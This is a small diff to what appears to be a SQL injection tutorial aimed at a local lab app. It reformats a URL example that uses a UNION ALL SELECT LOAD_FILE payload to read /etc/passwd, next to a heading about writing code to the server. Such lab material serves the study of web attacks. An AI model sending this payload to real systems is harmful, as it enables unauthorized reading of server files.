@@ -66,9 +66,7 @@ If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON
 
 Use `LOAD_FILE`:
 
-http://127.0.0.1:8781/load_file/list_users.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3
-
-`http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT LOAD_FILE('/etc/passwd/'),2,3`
+[http://127.0.0.1:8781/load_file/list_users.php?UserID=1 UNION ALL SELECT LOAD_FILE('/etc/passwd/'),2,3](http://127.0.0.1:8781/load_file/list_users.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3)
 
 ## Write code to server
 
